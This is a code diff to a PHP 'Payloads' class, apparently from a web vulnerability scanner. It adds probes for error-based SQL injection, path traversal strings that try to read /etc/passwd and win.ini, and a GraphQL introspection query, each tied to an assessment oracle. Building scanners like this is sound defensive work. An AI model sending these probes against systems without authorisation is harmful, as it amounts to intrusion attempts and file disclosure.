@@ -17,6 +17,9 @@ final class Payloads
             'xss' => self::xss($context['context'] ?? 'html'),
             'sqli_time' => self::sqliTime(),
             'ssrf' => self::ssrf(),
+            'sqli_error' => self::sqliError(),
+            'traversal' => self::traversal(),
+            'graphql' => self::graphql(),
             default => [],
         };
     }
@@ -45,5 +48,29 @@ final class Payloads
     private static function ssrf(): array
     {
         return [['value' => self::CALLBACK, 'oracle' => 'ssrfAssess', 'marker' => null]];
+    }
+
+    private static function sqliError(): array
+    {
+        return array_map(fn ($value) => ['value' => $value, 'oracle' => 'sqlErrorAssess', 'marker' => null], [
+            "'",
+            "')",
+            "';",
+            '"',
+        ]);
+    }
+
+    private static function traversal(): array
+    {
+        return array_map(fn ($value) => ['value' => $value, 'oracle' => 'traversalAssess', 'marker' => null], [
+            '../../../../../../etc/passwd',
+            '....//....//....//....//etc/passwd',
+            '..\\..\\..\\..\\windows\\win.ini',
+        ]);
+    }
+
+    private static function graphql(): array
+    {
+        return [['value' => '{__schema{queryType{name} types{name}}}', 'oracle' => 'graphqlAssess', 'marker' => null]];
     }
 }
